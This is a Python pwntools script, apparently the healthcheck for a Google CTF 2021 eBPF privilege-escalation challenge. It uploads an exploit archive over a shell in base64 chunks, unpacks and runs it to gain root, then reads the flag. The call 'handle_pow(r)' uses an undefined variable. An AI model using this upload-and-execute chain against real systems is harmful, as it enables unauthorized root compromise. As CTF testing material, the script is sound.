#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


from pwn import *
import argparse

host = '127.0.0.1'
port = 1337
exploit_path = '/home/user/p.tar.bz2'
chunk_size = 512

parser = argparse.ArgumentParser(
    description='gCTF-2021 pwn-ebpf healthcheck.')
parser.add_argument('--port', type=int, help='Connection port (default is 1337).')
parser.add_argument('--exploit_path', type=str, help='Path to the binary if not default.')
parser.add_argument('--chunk_size', type=int, help='Path to the binary if not default.')

args = parser.parse_args()


if args.port:
  port = args.port

if args.exploit_path:
  exploit_path = args.exploit_path

if args.chunk_size:
  chunk_size = args.chunk_size

conn = remote(host, port)

if conn.recvline().startswith(b'enabled'):
  handle_pow(r)

exploit = open(exploit_path, 'rb').read()


with log.progress('Uploading exploit...') as p:
  for i in range(0, len(exploit), chunk_size):
    c = b64e(exploit[i:i+chunk_size])
    conn.sendlineafter('$', 'echo %s | base64 -d >> /tmp/p.tar.bz2' % c)
    p.status(f'{100 * i // len(exploit)}%')


with log.progress('Getting root....') as p:
  conn.sendlineafter('$ ', 'cd /tmp')
  conn.sendlineafter('$ ', 'tar -xf p.tar.bz2')
  conn.sendlineafter('$ ', 'chmod +x ./p')
  conn.sendlineafter('$ ', './p')

conn.sendlineafter('$ ', 'cat /flag')

conn.recvline()
print(conn.recvregex(r'CTF{.*}'))


exit(0)
